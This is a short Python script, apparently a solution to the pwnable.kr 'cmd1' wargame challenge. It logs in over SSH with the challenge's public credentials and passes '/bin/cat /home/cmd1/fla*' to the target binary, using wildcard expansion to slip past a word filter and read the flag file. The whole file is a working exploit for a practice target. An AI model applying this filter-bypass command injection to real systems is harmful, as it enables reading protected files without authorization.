from pwn import *

# cmd1
host = 'pwnable.kr'
user = 'cmd1'
password = 'guest'
port = 2222

# Notes
#   * The only trick was use of the wildcard expanion, *
#   * Another classic solution is to just set `argv1` to `vim`

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  argv1 = "/bin/cat /home/cmd1/fla*"
  p = s.process(['./cmd1', argv1])
  print p.recvall()

if __name__ == '__main__':
  attack()
